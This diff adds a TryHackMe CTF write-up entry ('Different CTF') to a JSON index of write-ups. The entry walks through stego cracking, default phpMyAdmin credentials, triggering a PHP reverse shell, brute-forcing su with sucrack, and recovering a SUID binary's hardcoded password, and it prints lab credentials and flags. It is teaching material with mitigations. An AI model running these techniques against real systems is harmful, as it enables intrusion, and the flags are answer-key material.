@@ -1,6 +1,72 @@
 {
- "generated": "2026-11-22",
+ "generated": "2026-11-23",
  "writeups": [
+  {
+   "slug": "differentctf",
+   "title": "Different CTF",
+   "platform": "TryHackMe",
+   "difficulty": "Hard",
+   "date": "2026-11-23",
+   "github": "https://github.com/thecyberfarhan/CTF-Writeups/blob/main/TryHackme/differentctf_writeup.md",
+   "summary": "A directory brute force turns up a wordlist and a steganography image; cracking the image with that same wordlist yields base64-encoded FTP…",
+   "takeaway": "The biggest lesson is procedural, not technical: when every \"standard\" web RCE route is blocked, the fix is to question the model of the target, not to try a fifth variation of the same technique. Realizing there were two co-hosted sites sharing a filesystem is what actually unlocked the box, not a cleverer shell upload. On the privesc side: never trust a SUID binary's secrecy — if it has a hardcoded check, a trace will show it.",
+   "tldrHtml": "A directory brute force turns up a wordlist and a steganography image; cracking the image with that same wordlist yields base64-encoded FTP credentials. The FTP share turns out to be the same tree as the web root, but every direct route to code execution is blocked (unwritable theme files, no outbound internet for plugins, <code>secure_file_priv</code> restricting <code>INTO OUTFILE</code>). The actual path is through phpMyAdmin's default credentials: the site has two databases, one for the main domain and one for an undiscovered subdomain, and resetting the subdomain's WordPress admin hash makes a previously-uploaded reverse shell (sitting unreachable on the main site) suddenly live on the subdomain, because both sites share the same filesystem. That lands <code>www-data</code> and the first flag. From there, a password pattern noticed in the FTP credentials lets a modified wordlist brute-force the local user <code>hakanbey</code>'s <code>su</code> password (second flag). Root comes from reverse-engineering a SUID binary that, once fed its hardcoded password (recovered with <code>ltrace</code>), copies an otherwise-unreadable image out of <code>/root</code>; the image's raw bytes contain root's actual login password in plaintext.",
+   "tools": [
+    "RustScan / Nmap",
+    "feroxbuster",
+    "stegseek",
+    "ftp / lftp",
+    "phpMyAdmin",
+    "php-reverse-shell",
+    "sucrack",
+    "ltrace",
+    "hexdump"
+   ],
+   "sections": [
+    {
+     "id": "introduction",
+     "label": "Introduction",
+     "html": "<p>This box doesn't hinge on one exploit — it's a scavenger hunt where almost every &quot;obvious&quot; path to code execution is deliberately closed off, and the real one requires noticing that two WordPress sites sharing one filesystem means a shell uploaded for one can execute through the other. The second half swaps web exploitation for pure forensics: a reverse-engineering puzzle and a literal &quot;read the hex dump&quot; step stand between user and root, with no new network-facing vulnerability at all.</p>"
+    },
+    {
+     "id": "recon",
+     "label": "Recon",
+     "html": "<pre><code class=\"language-bash\">rustscan -a &lt;target&gt; --ulimit 5000 -- -Pn -sV -sC</code></pre>\n<pre><code>21/tcp open  ftp   vsftpd 3.0.3\n80/tcp open  http  Apache httpd 2.4.29 (Ubuntu)</code></pre>\n<p>Add <code>adana.thm</code> to <code>/etc/hosts</code> and brute-force content on the web server:</p>\n<pre><code class=\"language-bash\">feroxbuster -u http://adana.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,bak,js,json</code></pre>\n<pre><code>200  http://adana.thm/announcements/wordlist.txt            (1.5M+ lines)\n200  http://adana.thm/announcements/austrailian-bulldog-ant.jpg</code></pre>\n<p>A 1.5-million-line wordlist sitting next to an image is a direct hint at steganography.</p>"
+    },
+    {
+     "id": "foothold",
+     "label": "Foothold",
+     "html": "<pre><code class=\"language-bash\">stegseek austrailian-bulldog-ant.jpg wordlist.txt</code></pre>\n<pre><code>[i] Found passphrase: &quot;123adanaantinwar&quot;\n[i] Original filename: &quot;user-pass-ftp.txt&quot;\n[i] Extracting to &quot;austrailian-bulldog-ant.jpg.out&quot;</code></pre>\n<pre><code class=\"language-bash\">cat austrailian-bulldog-ant.jpg.out | base64 -d</code></pre>\n<pre><code>FTP-LOGIN\nUSER: hakanftp\nPASS: 123adanacrack%</code></pre>\n<pre><code class=\"language-bash\">ftp adana.thm\n# USER: hakanftp   PASS: 123adanacrack%</code></pre>\n<p>FTP logs in cleanly, and its root turns out to be the same tree WordPress serves over HTTP.</p>"
+    },
+    {
+     "id": "shell",
+     "label": "Shell and access",
+     "html": "<p>Every obvious route to RCE from here is blocked, in order:</p>\n<ul><li><strong>WordPress Theme Editor</strong> (after finding default phpMyAdmin creds <code>phpmyadmin:12345</code> and resetting a WP user's hash via SQL to log in): editing <code>404.php</code> to a PHP one-liner fails — &quot;You need to make this file writable.&quot;</li><li><strong>Plugin upload</strong>: fails with a WordPress.org connection error — the box has no outbound internet.</li><li><strong>SQL <code>INTO OUTFILE</code></strong>: blocked by <code>secure_file_priv</code>; writing to the one directory it does allow (<code>/var/lib/mysql-files/</code>) succeeds, but phpMyAdmin's LFI (CVE-2018-12613) only redirects to the homepage instead of including it.</li><li><strong>Re-uploading a PHP reverse shell via FTP</strong> into <code>/wp-content/themes/twentynineteen/</code>: still 404s on the main site.</li></ul>\n<p>phpMyAdmin showed <strong>two</strong> databases, <code>phpmyadmin</code> (the main site) and <code>phpmyadmin1</code>. The second belongs to an undiscovered subdomain, <code>subdomain.adana.thm</code>. Resetting its WordPress admin hash and logging in reveals the missing piece: because FTP and both WordPress sites share one filesystem, the shell already uploaded for the main site is live under the <strong>subdomain's</strong> webroot instead.</p>\n<pre><code class=\"language-bash\">nc -lvnp 4444\ncurl &quot;http://subdomain.adana.thm/php-reverse-shell.php&quot;</code></pre>\n<pre><code>uid=33(www-data) gid=33(www-data)</code></pre>\n<pre><code class=\"language-bash\">www-data@ubuntu:/$ cat /var/www/html/wwe3bbfla4g.txt\nTHM{343a7e2064a1d992c01ee201c346edff}</code></pre>"
+    },
+    {
+     "id": "escalation",
+     "label": "Escalation",
+     "html": "<p><code>ls -la /usr/bin/find</code> shows it's group-owned by <code>hakanbey</code> — not directly exploitable as <code>www-data</code>, but a clear naming hint (the FTP user was <code>hakanftp</code>, the WordPress admin was <code>hakanbey01</code>, this binary belongs to <code>hakanbey</code>): the next target account.</p>\n<p>The FTP password followed a pattern — <code>123adanacrack%</code> — so the same site wordlist, prefixed the same way, becomes a password list for the local system account:</p>\n<pre><code class=\"language-bash\">sed 's/^/123adana/' wordlist.txt &gt; adana_wordlist.txt</code></pre>\n<pre><code class=\"language-bash\">./sucrack -w 100 -b 500 -u hakanbey adana_wordlist.txt</code></pre>\n<pre><code>password is: 123adanasubaru</code></pre>\n<pre><code class=\"language-bash\">www-data@ubuntu:/tmp$ su hakanbey\nPassword: 123adanasubaru\nhakanbey@ubuntu:~$ cat user.txt\nTHM{8ba9d7715fe726332b7fc9bd00e67127}</code></pre>"
+    },
+    {
+     "id": "chain",
+     "label": "The full chain",
+     "html": "<p>As <code>hakanbey</code>, a SUID binary stands out:</p>\n<pre><code>-r-srwx--- 1 root hakanbey 12984 Jan 14 2021 /usr/bin/binary</code></pre>\n<p>Running it blind just kills the current terminal (<code>pkill -9 -t pts/0</code>) if given the wrong input. Tracing it instead of guessing:</p>\n<pre><code class=\"language-bash\">ltrace /usr/bin/binary</code></pre>\n<pre><code>strcat(&quot;war&quot;, &quot;zone&quot;)       = &quot;warzone&quot;\nstrcat(&quot;warzone&quot;, &quot;in&quot;)     = &quot;warzonein&quot;\nstrcat(&quot;warzonein&quot;, &quot;ada&quot;)  = &quot;warzoneinada&quot;\nstrcat(&quot;warzoneinada&quot;, &quot;na&quot;)= &quot;warzoneinadana&quot;\n...\nstrcmp(&quot;AA&quot;, &quot;warzoneinadana&quot;) = -54</code></pre>\n<p>The binary builds its expected password from hardcoded string fragments in memory — <code>ltrace</code> shows it plainly: <code>warzoneinadana</code>. Supplying it:</p>\n<pre><code class=\"language-bash\">hakanbey@ubuntu:~$ /usr/bin/binary\nI think you should enter the correct string here ==&gt;warzoneinadana</code></pre>\n<pre><code>Hint! : Hexeditor 00000020 ==&gt; ???? ==&gt; /home/hakanbey/Desktop/root.jpg (CyberChef)\nCopy /root/root.jpg ==&gt; /home/hakanbey/root.jpg</code></pre>\n<p>Supplying the right string makes the SUID binary copy an otherwise root-only file into <code>hakanbey</code>'s own home, readable group <code>hakanbey</code>:</p>\n<pre><code>-rw-rw-r-- 1 root hakanbey 45835 Nov 18 22:36 /home/hakanbey/root.jpg</code></pre>\n<p><code>strings</code> and <code>stegseek</code> against it on the box turn up nothing. Pulling it to the attacking machine and reading it as raw bytes is what the binary's own hint pointed at:</p>\n<pre><code class=\"language-bash\">hexdump -C root.jpg | head</code></pre>\n<pre><code>root:Go0odJo0BbBro0o</code></pre>\n<p>Root's login credential is sitting in plaintext in the image's raw bytes.</p>\n<pre><code class=\"language-bash\">hakanbey@ubuntu:~$ su root\nPassword: Go0odJo0BbBro0o\nroot@ubuntu:~# cat root.txt\nTHM{c5a9d3e4147a13cbd1ca24b014466a6c}</code></pre>"
+    },
+    {
+     "id": "rabbit-holes",
+     "label": "Rabbit holes",
+     "html": "<ul><li><strong>The Theme Editor, plugin upload and <code>INTO OUTFILE</code> routes</strong> all looked like the intended foothold and all dead-ended for a different reason each (unwritable file, no internet, <code>secure_file_priv</code>) — the actual fix was realizing there were two sites sharing one filesystem, not finding a fourth technique.</li><li><strong>A double base64 mistake</strong>: piping the extracted steg output through <code>base64</code> (encoding again) instead of <code>base64 -d</code> (decoding) produced garbage before the correct decode was run.</li><li><strong><code>/usr/bin/find</code>'s <code>hakanbey</code> group ownership</strong> looked like a GTFOBins privesc vector at first glance; it isn't executable by <code>www-data</code> at all and was only ever a naming hint toward the next account.</li><li><strong>Running the SUID <code>/usr/bin/binary</code> with a wrong guess</strong> kills the current pts session outright (<code>pkill -9 -t pts/0</code>) — tracing it with <code>ltrace</code> first avoids repeatedly losing the shell.</li><li><strong><code>strings</code>/<code>stegseek</code> on <code>root.jpg</code></strong> found nothing; the password wasn't hidden with steganography at all, just sitting as literal bytes, which only <code>hexdump</code> reveals.</li></ul>"
+    },
+    {
+     "id": "mitigations",
+     "label": "Mitigations",
+     "html": "<ul><li><strong>Secrets hidden in images reachable over HTTP:</strong> steganography is not access control. Anything in a public web directory should be assumed found.</li><li><strong>Default phpMyAdmin / database credentials:</strong> <code>phpmyadmin:12345</code> on a production-facing panel is a direct path to every database it manages, including authentication tables.</li><li><strong>Multiple sites sharing one filesystem:</strong> a shell uploaded for one virtual host being reachable from another is a hosting misconfiguration, not a WordPress bug — each site should be isolated to its own webroot and its own filesystem permissions.</li><li><strong>Predictable password patterns across accounts:</strong> reusing a prefix (<code>123adana...</code>) across the FTP account and a system account turns cracking one password into a wordlist for the next.</li><li><strong>A SUID binary with a hardcoded &quot;secret&quot; password:</strong> any password baked into a binary is recoverable with <code>ltrace</code>/<code>strace</code>/<code>strings</code> — SUID tooling must never gate a privileged action behind an embedded static secret.</li></ul>"
+    }
+   ],
+   "takeawayHtml": "The biggest lesson is procedural, not technical: when every &quot;standard&quot; web RCE route is blocked, the fix is to question the model of the target, not to try a fifth variation of the same technique. Realizing there were two co-hosted sites sharing a filesystem is what actually unlocked the box, not a cleverer shell upload. On the privesc side: never trust a SUID binary's secrecy — if it has a hardcoded check, a trace will show it.",
+   "againHtml": "<p>I'd trace the SUID binary with <code>ltrace</code> on the very first run instead of guessing blind and losing the terminal twice. I'd also check for a second virtual host / database the moment the first one's RCE routes all failed, instead of working through every single blocked technique first.</p>"
+  },
   {
    "slug": "enterprise",
    "title": "Enterprise",
